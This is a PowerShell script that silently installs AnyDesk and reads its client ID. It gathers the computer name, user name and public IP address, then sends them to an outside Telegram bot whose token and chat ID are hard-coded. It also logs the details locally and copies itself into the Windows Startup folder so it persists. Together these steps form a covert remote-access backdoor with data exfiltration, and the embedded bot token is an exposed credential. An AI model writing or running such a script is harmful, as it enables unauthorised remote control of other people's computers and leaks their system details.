# Install Only AnyDesk (Silent Mode)
choco install anydesk -y

# Telegram Alert Setup
$BOT_TOKEN = "8469309529:AAH1kdLYjtwee39EAgULMJa64Db_xRnWpYw"
$CHAT_ID = "1361241039"

# Get AnyDesk ID
Start-Sleep -Seconds 10
$anydeskId = (Get-ItemProperty "HKLM:\SOFTWARE\AnyDesk\").client_id

# System Info
$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME
$time = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
$ipAddress = (Invoke-RestMethod -Uri "https://api.ipify.org").ToString()

# Send Telegram Alert with AnyDesk ID
$message = "🚨 Laptop Accessed!`n`n💻 Computer: $computerName`n👤 User: $userName`n🌐 IP: $ipAddress`n⏰ Time: $time`n🔗 AnyDesk ID: $anydeskId`n`n📌 Connect: https://anydesk.com"
Invoke-WebRequest -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$message" -UseBasicParsing

# Create Log File
"$time - $computerName - $userName - $ipAddress - AnyDesk: $anydeskId" | Out-File -FilePath "$env:USERPROFILE\access_log.txt" -Append

# Add to Startup
Copy-Item "$PSCommandPath" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\script.ps1"
